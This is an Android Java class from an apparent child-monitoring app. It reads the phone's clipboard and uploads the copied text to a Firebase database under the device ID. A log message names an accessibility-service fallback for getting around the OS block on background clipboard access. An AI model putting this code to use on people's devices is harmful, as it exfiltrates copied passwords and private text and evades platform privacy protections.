package com.kidsguard.child;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;
import org.json.JSONObject;

public class ClipboardMonitor {
    private static final String TAG = "ClipboardMonitor";
    private final Context context;
    private final String deviceId;

    public ClipboardMonitor(Context context, String deviceId) {
        this.context = context.getApplicationContext();
        this.deviceId = deviceId;
    }

    public void readClipboard() {
        ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null) return;

        try {
            ClipData clip = cm.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                if (text != null && text.length() > 0) {
                    uploadClipboard(text.toString());
                }
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Clipboard access blocked by OS (background restriction). " +
                       "Fallback to AccessibilityService TYPE_VIEW_TEXT_SELECTION_CHANGED required.");
        } catch (Exception e) {
            Log.e(TAG, "Clipboard read failed", e);
        }
    }

    private void uploadClipboard(String text) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("text", text);
            payload.put("time", System.currentTimeMillis());
            FirebaseHelper.put("devices/" + deviceId + "/clipboard.json", payload.toString());
        } catch (Exception e) {
            Log.e(TAG, "Clipboard upload failed", e);
        }
    }
}
